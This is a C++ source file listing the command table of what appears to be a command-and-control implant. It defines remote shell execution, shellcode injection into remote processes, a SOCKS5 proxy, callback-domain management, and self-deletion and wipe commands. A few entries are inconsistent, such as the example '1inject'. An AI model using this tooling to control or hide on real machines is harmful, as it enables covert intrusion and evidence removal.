#include "Include/command/command.h"
#include "Include/global.hpp"
#define NO_SUBCOMMANDS  .Module = false,
#define BEHAVIOR_PROCESS_CREATION   "Process Creation"

std::vector<Command_t> CommandList={
    {
        .CommandString  = "help",
        .Description    = "Shows help message of specified command",
        .Usage          = "[command]",
        .Example        = "help shell",
        .RequiredArgs   = 0
    },
    {
        .CommandString  = "sleep",
        .Description    = "sets the delay to sleep with jitter",
        .Usage          = "[delay] [jitter]",
        .Example        = "sleep 10 50",
        .RequiredArgs   = 2
    },
    {
        .CommandString  = "shell",
        .Description    = "executes cmd.exe commands and gets the output",
        .Usage          = "[commands]",
        .Example        = R"(shell dir c:\windows\system32 (please don't do it))",
        .RequiredArgs   = 1
    },
    {
        .CommandString  = "inject",
        .Description    = "injects shellcode into a remote process",
        .Usage          = "[pid] [shellcode_path]",
        .Example        = "1inject 1234 /path/to/shellcode.bin",
        .RequiredArgs   = 2
    },
    {
        .CommandString  = "proxystart",
        .Description    = "starts a SOCKS5 proxy",
        .Usage          = "[callback_host] [agent_connect_port] [proxy_listener_port]",
        .Example        = "proxystart example.com 443 1080",
        .RequiredArgs   = 3
    },
    {
        .CommandString  = "proxystop",
        .Description    = "stops a SOCKS5 proxy",
        .Usage          = "[callback_host] [agent_connect_port] [proxy_listener_port]",
        .Example        = "proxystop example.com 443 1080",
        .RequiredArgs   = 3
    },
    {
        .CommandString  = "adddomain",
        .Description    = "adds a new callback domain",
        .Usage          = "[domain_name]",
        .Example        = "adddomain example.com",
        .RequiredArgs   = 1
    },
    {
        .CommandString  = "deldomain",
        .Description    = "deletes a callback domain",
        .Usage          = "[domain_name]",
        .Example        = "deldomain example.com",
        .RequiredArgs   = 1
    },
    {
        .CommandString  = "listdomain",
        .Description    = "lists all active callback domains",
        .Usage          = "",
        .Example        = "listdomain",
        .RequiredArgs   = 0
    },
    {
        .CommandString  = "kill",
        .Description    = "Terminate the current process.",
        .Usage          = "[yes]",
        .Example        = "kill yes",
        .RequiredArgs   = 1
    },
    {
            .CommandString  = "wipe",
            .Description    = "Terminate and delete the current process.",
            .Usage          = "[yes]",
            .Example        = "wipe yes",
            .RequiredArgs   = 1
     },
     {
        .CommandString  = "selfdel",
        .Description    = "Delete the current process from the disk.",
        .Usage          = "[yes]",
        .Example        = "selfdel yes",
        .RequiredArgs   = 1
     },
     {
       .CommandString  = "tasklist",
       .Description    = "Lists all queued tasks",
       .Usage          = "",
       .Example        = "tasklist",
       .RequiredArgs   = 0
    },
    {
      .CommandString  = "taskdel",
      .Description    = "Delete a specific task by ID",
      .Usage          = "[task id]",
      .Example        = "taskdel 123",
      .RequiredArgs   = 1
    },
    {
      .CommandString  = "tasksclean",
      .Description    = "Delete all tasks in the queue",
      .Usage          = "[yes]",
      .Example        = "tasksclean",
      .RequiredArgs   = 1
    },
    {
      .CommandString  = "clear",
      .Description    = "clear the terminal screen",
      .Usage          = "",
      .Example        = "clear",
      .RequiredArgs   = 1
    }
};
